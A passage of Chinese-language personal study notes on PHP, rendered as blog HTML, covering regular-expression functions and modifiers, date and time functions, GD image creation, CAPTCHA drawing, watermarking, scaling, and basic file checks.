class="line">	^或\A	匹配字符串开始位置</span><br><span class="line">	$或者\Z	匹配字符串的结束位置</span><br><span class="line">	|	匹配两个或多个模式</span><br><span class="line">	[]	匹配方括号中的任意一个字符</span><br><span class="line">	[^]	匹配除方括号中字符以外的任意一个字符</span><br><span class="line">	()	将括号中作为一个整体以便将其中的内容获取到</span><br><span class="line">		在我们的正则表达式中，可以使用圆括号来将某一段括起来，在圆括号的后面部分我们可以使用</span><br><span class="line">		\\数字  来代表圆括号部分所匹配的内容</span><br><span class="line">	&#x2F;*</span><br><span class="line">		()将括号中作为一个整体以便将其中的内容获取到</span><br><span class="line">			在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可					以使用</span><br><span class="line">                    \\数字 来代表圆括号部分所匹配到的内容</span><br><span class="line">        *&#x2F;</span><br><span class="line">        $pattern&#x3D;&#39;&#x2F;t(e)st\\1&#x2F;&#39;;&#39;\\1就代表第一个圆括号部分所匹配到的内容&#39;</span><br><span class="line">        &#x2F;&#x2F; 在()里面，匹配到什么\\1就要跟什么，不能和()的</span><br><span class="line">        $str&#x3D;&#39;      teste           &#39;;</span><br><span class="line">        var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">        var_dump($varr);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">    *&#x2F;</span><br><span class="line">    &#x2F;&#x2F; 在搜索的时候因为你是在te和st中间插入的\d所以只能在$str里面找te到st中间有数字的</span><br><span class="line">    &#x2F;&#x2F; 例如: te0-9st只要其中一个数字都可以，但是如果tes0-9t,在这个位置或者以外的位置,、</span><br><span class="line">    		将搜索不到。</span><br><span class="line">    $pattern&#x3D;&#39;&#x2F;te\dst&#x2F;&#39;;</span><br><span class="line">    $str&#x3D;&#39;testidhtesteite1st&#39;;</span><br><span class="line">    var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">    var_dump($varr);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;除了0-9之外都能匹配</span><br><span class="line">    $pattern&#x3D;&#39;&#x2F;te\Dst&#x2F;&#39;;</span><br><span class="line">    $str&#x3D;&#39;testidhteTsteite1st&#39;;</span><br><span class="line">    var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">    var_dump($varr);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582381577238.png" alt="1582519884665"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582524376623.png" alt="1582522025507"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">	.和*匹配</span><br><span class="line">	.*配合使用默认情况下是 贪婪匹配(尽可能多的匹配)</span><br><span class="line">*&#x2F;</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;;</span><br><span class="line">   $str&#x3D;&#39;testidhteTsteite1st&#39;;</span><br><span class="line">   var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">   var_dump($varr);</span><br><span class="line">   </span><br><span class="line">   &#x2F;*</span><br><span class="line">	.*后面加上一个?可以解决贪婪匹配问题，非贪婪匹配</span><br><span class="line">*&#x2F;</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;;</span><br><span class="line">   $str&#x3D;&#39;testidhteTsteite1st&#39;;</span><br><span class="line">   var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">   var_dump($varr);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582633658272.png" alt="1582524376623"></p>
<h4 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模式修正符是在正则表达式的定界符之后使用的，可以调整正则表达式的解释，扩展正则表达式在匹配、替换等操作时的某些功能，增强正则表达式的处理能力</span><br><span class="line">|	在和模式进行匹配时不区分大小写</span><br><span class="line">m	多行匹配，如果目标字符串中没有&quot;\n&quot;字符，或者正则表达式中没有出现^或$，设置这个修饰符不产			生任何影响</span><br><span class="line">s	如果设定了此修正符，那么将匹配所有的字符包括换行符</span><br><span class="line">U	禁止贪婪匹配</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模式修正符他是可以搭配使用的，可以使用多个</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;test&#x2F;i&#39;;</span><br><span class="line">$str &#x3D; &#39;    test  TEST    Test    TeSt    &#39;;</span><br><span class="line">var_dump(preg_match_all($pattern,$str,$arr));</span><br><span class="line">var_dump($arr);</span><br></pre></td></tr></table></figure>

<h4 id="与正则表达式配合的函数"><a href="#与正则表达式配合的函数" class="headerlink" title="与正则表达式配合的函数"></a>与正则表达式配合的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">最常用的匹配函数</span><br><span class="line">    1、preg_match()</span><br><span class="line">    	&#x2F;&#x2F;执行一个正则表达式匹配，返回值0次或者1次</span><br><span class="line">    	参数说明：</span><br><span class="line">		第一个参数：正则表达式</span><br><span class="line">		第二个参数：目标字符串</span><br><span class="line">		第三个参数：放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据。</span><br><span class="line">		第四个参数：可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认是0</span><br><span class="line">		第五个参数：可以传一个值，来表示从目标字符串的哪个位置开始匹配（单位是字节）。</span><br><span class="line">		$pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;;</span><br><span class="line">        $str &#x3D; &#39;     test   tadasst        &#39;;</span><br><span class="line">        if(preg_match($pattern,$str))&#123;</span><br><span class="line">            echo &#39;找到了&#39;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;没找到&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;var_dump($arr);</span><br><span class="line"></span><br><span class="line">    2、preg_match_all()</span><br><span class="line">    	&#x2F;&#x2F; 按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来</span><br><span class="line">    		$pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;;</span><br><span class="line">            $str &#x3D; &#39;     test   tadasst        &#39;;</span><br><span class="line">            var_dump(preg_match_all($pattern,$str,$arr));</span><br><span class="line">            var_dump($arr);</span><br><span class="line">            	结果:</span><br><span class="line">            		array (size&#x3D;2)</span><br><span class="line">                      0 &#x3D;&gt; </span><br><span class="line">                        array (size&#x3D;2)</span><br><span class="line">                          0 &#x3D;&gt; string &#39;test&#39; (length&#x3D;4)</span><br><span class="line">                          1 &#x3D;&gt; string &#39;tadasst&#39; (length&#x3D;7)</span><br><span class="line">                      1 &#x3D;&gt; </span><br><span class="line">                        array (size&#x3D;2)</span><br><span class="line">                          0 &#x3D;&gt; string &#39;e&#39; (length&#x3D;1)</span><br><span class="line">                          1 &#x3D;&gt; string &#39;adas&#39; (length&#x3D;4)</span><br><span class="line">    3、preg_replace()</span><br><span class="line">    	&#x2F;&#x2F;执行一个正则表达式的搜索和替换</span><br><span class="line">    	参数说明: </span><br><span class="line">    		第一个参数:正则表达式</span><br><span class="line">    		第二个参数:要替换成的字符串</span><br><span class="line">    		第三个参数:目标字符串</span><br><span class="line">    		第四个参数:默认是-1，就是替换所有符合特征部分的</span><br><span class="line">    	$pattern &#x3D; &#39;&#x2F;(.*?)&#x2F;&#39;;</span><br><span class="line">        $str &#x3D; &#39;\\1&#39;;</span><br><span class="line">        $str1 &#x3D; &#39;saiudhdstest&#39;;</span><br><span class="line">        var_dump(preg_replace($pattern,$str,$str1));</span><br><span class="line">        var_dump($str1);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582945264007.png" alt="1582633658272"></p>
<h4 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、设置时区</span><br><span class="line">	默认的时区是UTC</span><br><span class="line">	date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">二、获取当前Unix时间戳</span><br><span class="line">	Unix时间戳</span><br><span class="line">	从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数</span><br><span class="line">	time();</span><br><span class="line">三、获取指定时间的Unix时间戳</span><br><span class="line">	mktime();</span><br><span class="line">	&#x2F;&#x2F;顺序是，时,分,秒,月,日,年</span><br><span class="line">	var_dump(mktime(0,0,0,10,1,2015));</span><br><span class="line">	还可以</span><br><span class="line">	$nowtime&#x3D;time();&#x2F;&#x2F;获取Unix时间戳</span><br><span class="line">    &#x2F;&#x2F;顺序是，时,分,秒,月,日,年</span><br><span class="line">    $mktime1&#x3D;mktime(0,0,0,10,1,2020);</span><br><span class="line">    echo &#39;距离2020年国庆还有&#39;.(($mktime1-$nowtime)&#x2F;60&#x2F;60&#x2F;24).&#39;天&#39;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">四、从Unix时间戳取得时间日期信息</span><br><span class="line">&#x2F;&#x2F;格式化一个本地时间&#x2F;日期</span><br><span class="line">	date();</span><br><span class="line">	第一个参数：必填，自己定义时间日期格式</span><br><span class="line">	var_dump(date(&#39;Y-m-d G:i:s&#39;));</span><br><span class="line"></span><br><span class="line">五、获取Unix时间戳和微秒数</span><br><span class="line">&#x2F;&#x2F;返回当前Unix时间戳和微秒数 </span><br><span class="line">	microtime();</span><br><span class="line">	var_dump(microtime());</span><br><span class="line">	var_dump(microtime(true));</span><br><span class="line">	</span><br><span class="line">	可以用于查看程序运行时间</span><br><span class="line">	例如for循环</span><br><span class="line">	&#x2F;&#x2F;round();函数是显示小数点后几位</span><br><span class="line">	$start&#x3D;microtime(true);</span><br><span class="line">    for ($i&#x3D;0;$i&lt;100000;$i++)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $end&#x3D;microtime(true);</span><br><span class="line">    echo &#39;循环用了&#39;.round(($end-$start),3).&#39;秒&#39;;</span><br></pre></td></tr></table></figure>

<h4 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建一个图像应该完成如下所示的四个基本步骤</span><br><span class="line">1、创建图像</span><br><span class="line">	所有的绘图设计都需要在一个图像上完成，以后的操作都将基于这个图像</span><br><span class="line">2、绘制图像</span><br><span class="line">	图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充画布、画		点、线段、各种几何图形，以及向图像的添加文本等</span><br><span class="line">3、输出图像</span><br><span class="line">	完成整个图像的绘制之后，需要将图像以某个格式保存到服务器的文件中，或者将图像直接输出到浏	览器上显示给用户。但在图像输出之前一定要是用header()函数发送Content-type通知浏览器，	这次发送的是图片不是文本</span><br><span class="line">4、释放资源</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、创建图像</span><br><span class="line">imagecreatetruecolor();	创建一个真彩色图像</span><br><span class="line">	实例:</span><br><span class="line">		$img &#x3D; imagecreatetruecolor(200,200);</span><br><span class="line">二、绘制图像</span><br><span class="line">	$color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色</span><br><span class="line">	$color2&#x3D;imagecolorallocate($img,46,219,50);</span><br><span class="line"></span><br><span class="line">三、输出图像</span><br><span class="line">	header函数注意点</span><br><span class="line">	在header函数之前不能输出任何内容，包括空格，空字符串等</span><br><span class="line">四、释放资源</span><br><span class="line">imagedestroy()	&#x2F;&#x2F;销毁图片</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实例整体:</span><br><span class="line">&#x2F;&#x2F;不使用header浏览器不知道你要输出的什么会乱码，</span><br><span class="line">&#x2F;&#x2F;NetWork里面显示,Content-Type:test&#x2F;html</span><br><span class="line">&#x2F;&#x2F;使用header更改格式，底下用的imagejpeg所以更改为image传输为jpeg</span><br><span class="line"></span><br><span class="line">	header(&#39;Content-Type:image&#x2F;jpeg&#39;);</span><br><span class="line">    $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像</span><br><span class="line">    $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色</span><br><span class="line">    $color2&#x3D;imagecolorallocate($img,46,219,50);</span><br><span class="line">    imagefill($img,0,0,$color2);</span><br><span class="line">    imagejpeg($img);</span><br><span class="line"></span><br><span class="line">另存为图片</span><br><span class="line">&#x2F;&#x2F;将之前的image&#x2F;jpeg改为原本的text&#x2F;html</span><br><span class="line">    header(&#39;Content-Type:text&#x2F;html charset&#x3D;UFT-8&#39;);</span><br><span class="line">    $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像</span><br><span class="line">    $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色</span><br><span class="line">    $color2&#x3D;imagecolorallocate($img,46,219,50);</span><br><span class="line">    imagefill($img,0,0,$color2);</span><br><span class="line">&#x2F;&#x2F;在这里加一个相对路径就是要保存的位置</span><br><span class="line">    if(imagejpeg($img,&#39;images&#x2F;sunwukong.jpeg&#39;))&#123;	&#x2F;&#x2F;保存图片</span><br><span class="line">        echo &#39;保存成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    imagedestroy($img);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582710213923.png" alt="1582710213923"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绘制图像</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582710241411.png" alt="1582710241411"></p>
<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$witch&#x3D;120;</span><br><span class="line">$height&#x3D;60;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 更改格式，否则报错</span><br><span class="line">header(&#39;Content-Type:image&#x2F;jpeg&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置随机数，使用.将其连接</span><br><span class="line">$string&#x3D;&#39;&#39;;</span><br><span class="line">for($i&#x3D;0;$i&lt;4;$i++)&#123;</span><br><span class="line">	$element&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;);</span><br><span class="line">	$string.&#x3D;$element[rand(0,count($element)-1)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个真彩图像</span><br><span class="line">$img &#x3D; imagecreatetruecolor($witch,$height);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 填充颜色</span><br><span class="line">$col1&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));</span><br><span class="line"></span><br><span class="line">$col2&#x3D;imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));</span><br><span class="line"></span><br><span class="line">$col3&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 填充区域</span><br><span class="line">$fill &#x3D; imagefill($img,0,0,$col1);</span><br><span class="line">imagerectangle($img,0,0,$witch-1,$height-1,$col2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建单一像素进行循环</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123;</span><br><span class="line">	imagesetpixel($img,rand(0,$witch-1),rand(0,$height-1),</span><br><span class="line">	imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建线段，进行循环</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123;</span><br><span class="line">	imageline($img,rand(0,$witch&#x2F;2),rand(0,$height),</span><br><span class="line">	rand($witch&#x2F;2,$witch),rand(0,$height),</span><br><span class="line">	imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向图像中创建字符串</span><br><span class="line">&#x2F;&#x2F; imagestring($img,5,0,0,&#39;abcd&#39;,$col3);</span><br><span class="line">imagettftext($img,25,rand(2,25),rand(30,50),rand(30,$height),$col3,&#39;font&#x2F;ITCBLKAD.TTF&#39;,$string);</span><br><span class="line"></span><br><span class="line">imagejpeg($img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">水印</span><br><span class="line">1、创建新的</span><br><span class="line">	imagecreatetruecolor() </span><br><span class="line">2、打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582951910539.png" alt="1582796508013"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文字水印</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpg&#39;);</span><br><span class="line">$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);</span><br><span class="line">$color&#x3D;imagecolorallocate($img,120,55,42);</span><br><span class="line"></span><br><span class="line">$width&#x3D;imagesx($img);</span><br><span class="line">$height&#x3D;imagesy($img);</span><br><span class="line">$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">$length&#x3D;$position[2]-$position[0];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imagettftext($img,20,0,$width-1-$length-($width&#x2F;5),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">图片和文字水印</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpg&#39;);</span><br><span class="line">$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);</span><br><span class="line">$mark&#x3D;imagecreatefromgif(&#39;picture&#x2F;minalt.gif&#39;);</span><br><span class="line">$color&#x3D;imagecolorallocate($img,120,55,42);</span><br><span class="line"></span><br><span class="line">$width&#x3D;imagesx($img);</span><br><span class="line">$height&#x3D;imagesy($img);</span><br><span class="line"></span><br><span class="line">$markWidth&#x3D;imagesx($mark);</span><br><span class="line">$markHeight&#x3D;imagesy($mark);</span><br><span class="line"></span><br><span class="line">$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">$length&#x3D;$position[2]-$position[0];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 文字水印</span><br><span class="line">imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">参数说明：</span><br><span class="line">	$img：目标图像资源</span><br><span class="line">	$wateMake：水印的图像资源</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(x轴的位置)</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(y轴的位置)</span><br><span class="line">	0：从水印图像资源的x坐标为0的位置开始拷贝</span><br><span class="line">	0：从水印图像资源的y坐标为0的位置开始拷贝</span><br><span class="line">	$wateWidth：所要拷贝水印图像的长度</span><br><span class="line">	$wateHeight：所要拷贝水印图像的宽度</span><br><span class="line">*&#x2F;</span><br><span class="line">imagecopy($img,$mark,100,100,0,0,$markWidth,$markHeight);</span><br><span class="line"></span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">更改图片透明度</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpg&#39;);</span><br><span class="line">$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);</span><br><span class="line">$mark&#x3D;imagecreatefrompng(&#39;picture&#x2F;xiao.png&#39;);</span><br><span class="line">$color&#x3D;imagecolorallocate($img,120,55,42);</span><br><span class="line"></span><br><span class="line">$width&#x3D;imagesx($img);</span><br><span class="line">$height&#x3D;imagesy($img);</span><br><span class="line"></span><br><span class="line">$markWidth&#x3D;imagesx($mark);</span><br><span class="line">$markHeight&#x3D;imagesy($mark);</span><br><span class="line"></span><br><span class="line">$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">$length&#x3D;$position[2]-$position[0];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 文字水印</span><br><span class="line">imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">参数说明：</span><br><span class="line">	$img：目标图像资源</span><br><span class="line">	$wateMake：水印的图像资源</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(x轴的位置)</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(y轴的位置)</span><br><span class="line">	0：从水印图像资源的x坐标为0的位置开始拷贝</span><br><span class="line">	0：从水印图像资源的y坐标为0的位置开始拷贝</span><br><span class="line">	$wateWidth：所要拷贝水印图像的长度</span><br><span class="line">	$wateHeight：所要拷贝水印图像的宽度</span><br><span class="line">	0：代表透明度，数字越小越透明，100的时候相当于 imagecopy</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;imagecopy($img,$mark,800,500,0,0,$markWidth,$markHeight);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可以更改透明度</span><br><span class="line">imagecopymerge($img,$mark,800,500,0,0,$markWidth,$markHeight,0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure>

<h4 id="缩放与裁剪"><a href="#缩放与裁剪" class="headerlink" title="缩放与裁剪"></a>缩放与裁剪</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">	等比例缩放</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpeg&#39;);</span><br><span class="line">$width&#x3D;500;</span><br><span class="line"></span><br><span class="line">$img&#x3D;imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$imgWidth&#x3D;imagesx($img);</span><br><span class="line">$imgHeight&#x3D;imagesy($img);</span><br><span class="line"></span><br><span class="line">$height&#x3D;$width&#x2F;($imgWidth&#x2F;$imgHeight);</span><br><span class="line">$target&#x3D;imagecreatetruecolor($width,$height);</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">imagecopyresampled(1,2,3,4,5,6,7,8,9,10)函数中的参数</span><br><span class="line">	1、目标图像资源</span><br><span class="line">	2、原图像资源(需要采样的那个图像资源)</span><br><span class="line">	3、目标图像资源坐标位置(x)轴</span><br><span class="line">	4、目标图像资源坐标位置(y)轴(与3一样确定了一个坐标,把采样到的部分，放到目标图像资源的什么位置)</span><br><span class="line">	5、原图像资源坐标位置(x)轴</span><br><span class="line">	6、原图像资源坐标位置(y)轴(你要残阳的原图像资源的某个部分的起始坐标()</span><br><span class="line">	7、目标长度</span><br><span class="line">	8、目标高度(确定了放到目标图像资源上面的尺寸)</span><br><span class="line">	9、原图像长度</span><br><span class="line">	10、原图像高度(确定了采样原图像资源的某个部分)</span><br><span class="line">*&#x2F;</span><br><span class="line">imagecopyresampled($target,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 裁剪</span><br><span class="line">&#x2F;&#x2F; imagecopyresampled($target,$img,0,0,0,0,100,100,100,100);</span><br><span class="line"></span><br><span class="line">if(imagejpeg($target))&#123;</span><br><span class="line">	imagejpeg($target,&#39;picture&#x2F;xxhh.jpg&#39;);</span><br><span class="line">&#125;</span><br><span class="line">imagedestroy($img);</span><br><span class="line">imagedestroy($target);</span><br></pre></td></tr></table></figure>

<h4 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h4><h5 id="目录的基本操作"><a href="#目录的基本操作" class="headerlink" title="目录的基本操作"></a>目录的基本操作</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任何数据类型变量所有存储的数据，都是在程序运行时才加载到内存中的，而不能持久保存，那么如果需要将数据长久的保存起来，有两种方法，保存到普通文件中或者保存到数据中，我们的PHP可以在我们的服务器上生成目录、创建、编辑、删除、修改文件属性等操作</span><br></pre></td></tr></table></figure>

<h5 id="一、判断普通文件和目录"><a href="#一、判断普通文件和目录" class="headerlink" title="一、判断普通文件和目录"></a>一、判断普通文件和目录</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、is_file()	&#x2F;&#x2F; 判断给定的文件名是否为一个正常的文件</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(is_file(&#39;index.php&#39;));</span><br><span class="line">2、is_dir()	&#x2F;&#x2F; 判断给定文件名是否是一个目录</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(is_dir(&#39;..&#x2F;demo5&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<h5 id="二、文件的属性"><a href="#二、文件的属性" class="headerlink" title="二、文件的属性"></a>二、文件的属性</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582956505438.png" alt="1582945264007"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_exists()	&#x2F;&#x2F; 检查文件或目录是否存在</span><br><span class="line">        实例:</span><br><span class="line">        &#x2F;&#x2F; 检查文件</span><br><span class="line">            $sum &#x3D; &#39;index.php&#39;;</span><br><span class="line">            if(file_exists($sum))&#123;</span><br><span class="line">                echo &#39;true&#39;.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                    echo &#39;false&#39;.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 检查目录</span><br><span class="line">            $sum &#x3D; &#39;..&#x2F;demo5&#x2F;&#39;;</span><br><span class="line">            if(file_exists($sum))&#123;</span><br><span class="line">                echo &#39;true&#39;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                    echo &#39;false&#39;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">filesize()	&#x2F;&#x2F; 取得普通文件的大小</span><br><span class="line">	实例：</span><br><span class="line">        $filename&#x3D;&#39;index.php&#39;;</span><br><span class="line">        &#x2F;&#x2F; 想要将字节转换成MB需要&#x2F;1024&#x2F;1024 除两次1024</span><br><span class="line">        echo $filename.&#39;:&#39;.filesize($filename).&#39;bytes&#39;;</span><br><span class="line">        </span><br><span class="line">     </span><br><span class="line">&#x2F;&#x2F; 如果可写，可读返回true   </span><br><span class="line">is_readable()	&#x2F;&#x2F; 判断文件是否可读</span><br><span class="line">	实例:</span><br><span class="line">		var_dump(is_readable(&#39;index.php&#39;));</span><br><span class="line">		</span><br><span class="line">is_writable()	&#x2F;&#x2F; 判断文件是否可写</span><br><span class="line">	实例:</span><br><span class="line">		var_dump(is_writeable(&#39;index.php&#39;));</span><br><span class="line">		</span><br><span class="line">filectime();	&#x2F;&#x2F; 获取文件创建时间</span><br><span class="line">	实例:</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">		echo date(&#39;Y-m-d G:i:s&#39;,filectime(&#39;index.php&#39;));</span><br><span class="line">		</span><br><span class="line">filemtime()		&#x2F;&#x2F; 获取文件修改时间</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">		echo date(&#39;Y-m-d G:i:s&#39;,filemtime(&#39;index.php&#39;));</span><br></pre></td></tr></table></figure>

<h5 id="三、目录的基本操作"><a href="#三、目录的基本操作" class="headerlink" title="三、目录的基本操作"></a>三、目录的基本操作</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582796508013.png" alt="1582951910539"></p>
